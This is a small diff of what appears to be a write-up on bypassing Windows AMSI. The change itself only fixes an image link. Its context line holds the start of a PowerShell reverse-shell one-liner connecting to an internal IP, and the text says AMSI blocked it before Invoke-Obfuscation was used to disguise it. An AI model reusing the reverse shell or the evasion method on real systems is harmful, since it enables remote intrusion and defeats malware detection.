@@ -8,7 +8,7 @@ $client = New-Object System.Net.Sockets.TCPClient('192.168.50.18',9999);$stream 
 
 As shown in the screenshot below, AMSI managed to detect the command as malicious and blocked it.
 
-![AMSI](misc\image.png)
+![](misc/image.png)
 
 To obfuscate the command, the tool **Invoke Obfuscation** (https://github.com/danielbohannon/Invoke-Obfuscation) was used. 
 
